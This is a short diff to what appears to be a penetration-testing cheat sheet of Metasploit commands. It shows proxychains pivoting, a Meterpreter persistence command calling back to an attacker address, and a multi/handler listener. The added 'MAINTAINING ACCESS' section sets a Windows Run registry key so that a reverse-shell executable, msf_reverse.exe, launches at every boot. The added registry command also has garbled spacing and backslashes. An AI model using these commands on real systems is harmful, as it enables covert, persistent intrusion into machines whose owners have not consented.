@@ -177,3 +177,7 @@ proxychains firefox // start a web browser through pivot for accessing website i
 PERSISTENCE 
 meterpreter> run persistence -A -X -i 5 -p 8080 -r ourIPaddress // setting persistence
 msf> use exploit/multi/handler // start listener with same options as above (same payload, IP address and local port
+
+MAINTAINING ACCESS
+
+reg setval  - k  HKLM \ \ software \ \ microsoft \ \ windows \ \ currentversion \ \ run   - d '"C: \ inetpub \ ftproot \ msf_ reverse .exe"'  - v msf_ reverse
